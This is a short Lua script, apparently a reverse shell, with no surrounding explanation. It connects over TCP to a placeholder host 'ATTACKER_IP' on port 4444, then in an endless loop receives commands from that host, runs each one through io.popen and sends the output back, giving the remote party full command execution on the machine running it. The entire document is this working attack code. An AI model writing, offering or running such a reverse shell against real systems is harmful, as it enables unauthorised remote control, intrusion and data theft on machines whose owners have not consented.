local socket = require("socket")
local host, port = "ATTACKER_IP", 4444
local tcp = assert(socket.tcp())
tcp:connect(host, port)
tcp:send("Connected!\n")

while true do
    local cmd = tcp:receive()
    local handle = io.popen(cmd)
    local result = handle:read("*a")
    handle:close()
    tcp:send(result)
end